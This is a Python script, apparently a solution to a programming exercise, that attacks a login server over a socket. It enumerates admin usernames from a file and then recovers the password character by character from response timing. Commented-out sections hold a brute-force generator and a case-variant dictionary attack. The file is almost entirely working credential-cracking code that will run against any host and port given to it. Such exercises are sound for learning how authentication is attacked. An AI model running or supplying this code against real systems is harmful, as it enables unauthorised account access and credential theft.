import sys
import socket
import string
from itertools import product
import os
import json
import time


class Hacker():
    def __init__(self, args):
        self.hostname = args[1]
        self.port = int(args[2])
        # self.hostname = 'localhost'
        # self.port = 63342
        self.address = (self.hostname, self.port)

    def connect_2_server(self):
        self.client_socket = socket.socket()
        self.client_socket.connect(self.address)

    # def password_generator(self):
    #     index = 1
    #     abc = string.ascii_letters+string.digits
    #     while index < len(abc):
    #         yield from product(abc, repeat=index)
    #         index += 1

# def open_txt_file():
#     dirname = os.path.dirname(__file__)
#     filename = os.path.join(dirname, 'passwords.txt')
#     with open(filename) as f:
#         for password in f:
#             yield password.strip()

    def open_admin_logins(self):
        dirname = os.path.dirname(__file__)
        filename = os.path.join(dirname, 'logins.txt')
        with open(filename) as f:
            for login in f:
                yield login.strip()

    def login_to_json(self):
        for login in self.open_admin_logins():
            json_dict = {}
            json_dict["login"] = login
            json_dict["password"] = ' '
            decoded = self.send_receive(json_dict)
            if decoded["result"] == "Wrong password!":
                return self.find_password(json_dict)


    def send_receive(self, login):
        json_dumped = json.dumps(login)
        data = json_dumped.encode()
        self.client_socket.send(data)
        response = self.client_socket.recv(1024)
        response = response.decode()
        self.json_decoded = json.loads(response)
        return self.json_decoded

    def find_password(self, login):
        abc = string.ascii_letters + string.digits
        index = 0
        next_letter = 0
        while True:
            for symbol in abc:
                my_list = list(login['password'])
                my_list[next_letter] = symbol
                login.update({'password': ''.join(my_list)})
                start = time.perf_counter()
                decoded = self.send_receive(login)
                end = time.perf_counter()
                x = end - start
                if x >= 0.1:
                    login['password'] += symbol
                    next_letter += 1
                if decoded['result'] == 'Connection success!':
                    return json.dumps(login)
            index += 1



# def main():
#     args = sys.argv
#     hacker = Hacker(args)
#     hacker.connect_2_server()
#     for password in open_txt_file():
#         list_ = [''.join(x) for x in product(*[[l.upper(), l.lower()] for l in password])]
#         for word in list_:
#             data = word.encode()
#             hacker.client_socket.send(data)
#             response = hacker.client_socket.recv(1024)
#             response = response.decode()
#             if response == 'Connection success!':
#                 return word
#     hacker.client_socket.close()

def main():
    args = sys.argv
    hacker = Hacker(args)
    hacker.connect_2_server()
    return hacker.login_to_json()

print(main())
